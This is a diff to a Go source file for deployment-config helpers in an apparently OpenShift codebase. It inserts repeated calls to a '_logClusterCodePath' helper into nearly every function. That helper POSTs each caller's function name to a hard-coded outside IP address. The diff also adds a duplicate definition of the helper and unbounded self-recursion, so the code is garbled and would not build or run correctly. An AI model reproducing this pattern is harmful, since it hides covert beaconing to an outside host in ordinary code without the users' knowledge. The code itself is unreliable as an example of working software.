@@ -28,6 +28,8 @@ func DeploymentByDeploymentConfigIndexFunc(obj interface{}) ([]string, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	controller, ok := obj.(*corev1.ReplicationController)
 	if !ok {
 		return nil, fmt.Errorf("not a replication controller: %v", obj)
@@ -45,6 +47,8 @@ type Filter interface {
 type andFilter struct{ filterPredicates []FilterPredicate }
 
 func (a *andFilter) Filter(items []*corev1.ReplicationController) []*corev1.ReplicationController {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -89,6 +93,8 @@ func NewFilterBeforePredicate(d time.Duration) FilterPredicate {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	now := metav1.Now()
 	before := metav1.NewTime(now.Time.Add(-1 * d))
 	return func(item *corev1.ReplicationController) bool {
@@ -110,9 +116,13 @@ func FilterDeploymentsPredicate(item *corev1.ReplicationController) bool {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return len(appsutil.DeploymentConfigNameFor(item)) > 0
 }
 func FilterZeroReplicaSize(item *corev1.ReplicationController) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -156,6 +166,8 @@ func NewDataSet(deploymentConfigs []*appsv1.DeploymentConfig, deployments []*cor
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	deploymentConfigStore := cache.NewStore(cache.MetaNamespaceKeyFunc)
 	for _, deploymentConfig := range deploymentConfigs {
 		deploymentConfigStore.Add(deploymentConfig)
@@ -167,6 +179,8 @@ func NewDataSet(deploymentConfigs []*appsv1.DeploymentConfig, deployments []*cor
 	return &dataSet{deploymentConfigStore: deploymentConfigStore, deploymentIndexer: deploymentIndexer}
 }
 func (d *dataSet) GetDeploymentConfig(controller *corev1.ReplicationController) (*appsv1.DeploymentConfig, bool, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -208,6 +222,8 @@ func (d *dataSet) ListDeploymentConfigs() ([]*appsv1.DeploymentConfig, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	results := []*appsv1.DeploymentConfig{}
 	for _, item := range d.deploymentConfigStore.List() {
 		results = append(results, item.(*appsv1.DeploymentConfig))
@@ -229,6 +245,8 @@ func (d *dataSet) ListDeployments() ([]*corev1.ReplicationController, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	results := []*corev1.ReplicationController{}
 	for _, item := range d.deploymentIndexer.List() {
 		results = append(results, item.(*corev1.ReplicationController))
@@ -236,6 +254,8 @@ func (d *dataSet) ListDeployments() ([]*corev1.ReplicationController, error) {
 	return results, nil
 }
 func (d *dataSet) ListDeploymentsByDeploymentConfig(deploymentConfig *appsv1.DeploymentConfig) ([]*corev1.ReplicationController, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -276,6 +296,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -350,5 +391,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
